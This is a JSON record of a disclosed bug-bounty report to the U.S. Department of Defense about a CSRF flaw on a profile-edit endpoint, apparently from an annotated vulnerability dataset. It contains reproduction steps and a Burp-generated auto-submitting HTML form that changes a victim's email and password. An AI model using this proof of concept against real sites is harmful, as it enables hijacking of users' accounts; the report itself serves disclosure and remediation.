{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "br0x1337 ",
    "title": "CSRF leads to Account takeover",
    "content": "\nDescription:\nDuring my search in this domain I found it vulnerable to CSRF so I tried to escalate it Account takeover and I succeed\nImpact\nAccount takeover via CSRF\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nVulnerable domain and endpoint : https://\u2588\u2588\u2588\u2588\u2588\u2588/account/profile/edit\nClick on this URL: https://\u2588\u2588\u2588/account/register and fill in the required fields.\nYou will be instructed to check your inbox for a verification email, but you can avoid this step and log in using the username and password you created on the registration page.\nNavigate to this endpoint https://\u2588\u2588\u2588\u2588\u2588/account/profile/edit and attempt to modify the first name and email and password.\nObserve this in the history of Burp Suite: https://\u2588\u2588\u2588\u2588/account/profile/edit.\nYou can notice there is no protection against CSRF on this endpoint.\nExecuted the proof of concept (POC), and it worked.~\nCode 638 Bytes\n1<html>\n2  <!-- CSRF PoC - generated by Burp Suite Professional -->\n3  <body>\n4    <form action=\"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/account/profile/edit\" method=\"POST\">\n5      <input type=\"hidden\" name=\"username\" value=\"hacker\" />\n6      <input type=\"hidden\" name=\"password\" value=\"\" />\n7      <input type=\"hidden\" name=\"cpassword\" value=\"\" />\n8      <input type=\"hidden\" name=\"email\" value=\"rahes53167&#64;esterace&#46;com\" />\n9      <input type=\"hidden\" name=\"save\" value=\"Save\" />\n10      <input type=\"submit\" value=\"Submit request\" />\n11    </form>\n12    <script>\n13      history.pushState('', '', '/');\n14      document.forms[0].submit();\n15    </script>\n16  </body>\n17</html>\nSuggested Mitigation/Remediation Actions\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-Site Request Forgery (CSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1734569400,
    "report_url": "https://hackerone.com/reports/2712857",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to the registration page at https://\u2588\u2588\u2588/account/register and create a new account."
        ],
        [
            2,
            "After registration, log in and go to the profile edit page at https://\u2588\u2588\u2588\u2588\u2588/account/profile/edit. Observe the lack of CSRF protection when modifying profile details."
        ],
        [
            3,
            "Create a malicious HTML form that submits a POST request to the profile edit endpoint with modified user details (username, password, email)."
        ],
        [
            4,
            "Trick the victim into loading the malicious HTML page, which automatically submits the form, leading to account takeover."
        ]
    ],
    "vuln_description": "The vulnerability is a CSRF (Cross-Site Request Forgery) flaw that allows an attacker to take over a user's account by tricking them into executing unauthorized actions (such as changing their email and password) without their consent. The attack exploits the lack of CSRF tokens or other protections on the profile edit endpoint.",
    "reason": "The attack is straightforward and involves standard CSRF exploitation techniques. The steps are linear and do not require complex interactions or deep understanding of the application's state. The lack of CSRF protection is a common and well-documented issue, making the discovery process relatively simple.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}